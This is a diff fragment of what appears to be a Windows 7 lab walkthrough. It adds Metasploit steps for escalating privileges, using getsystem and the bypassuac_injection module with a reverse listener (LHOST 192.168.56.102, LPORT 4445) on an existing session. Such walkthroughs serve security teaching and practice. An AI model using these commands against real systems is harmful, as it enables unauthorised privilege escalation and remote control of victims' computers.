@@ -169,5 +169,17 @@ Now we have gained administrator access and successfully bypasses the User Acces
 ``` 
 getsystem 
 ```
+```
 
+    💡 Why a new port (4445)?
+    Your original handler is still running on port 1234 (or 4444). If you reuse the same port, the new payload may conflict or fail. Use a fresh port.
 
+🛠️ Alternative: Use bypassuac_injection (More Reliable)
+
+Some Windows 7 builds block file writes (which bypassuac uses). Try the in-memory version:
+use exploit/windows/local/bypassuac_injection
+set session 1
+set LHOST 192.168.56.102
+set LPORT 4445
+exploit
+```
